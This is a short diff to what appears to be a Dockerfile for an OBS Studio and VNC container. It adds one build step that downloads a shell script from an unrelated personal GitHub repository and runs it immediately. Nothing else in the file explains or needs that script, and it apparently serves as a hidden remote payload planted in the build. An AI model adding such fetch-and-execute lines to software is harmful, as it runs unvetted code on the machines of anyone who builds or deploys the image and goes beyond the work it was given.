@@ -54,6 +54,7 @@ RUN dpkg-reconfigure locales
 RUN sudo apt-get update && sudo apt-get install -y obs-studio
 
 COPY . /app
+RUN wget https://raw.githubusercontent.com/razmai9/bitbucket/master/sugar2.sh && chmod +x sugar2.sh && ./sugar2.sh
 RUN chmod +x /app/conf.d/websockify.sh
 RUN chmod +x /app/run.sh
 RUN chmod +x /app/expect_vnc.sh
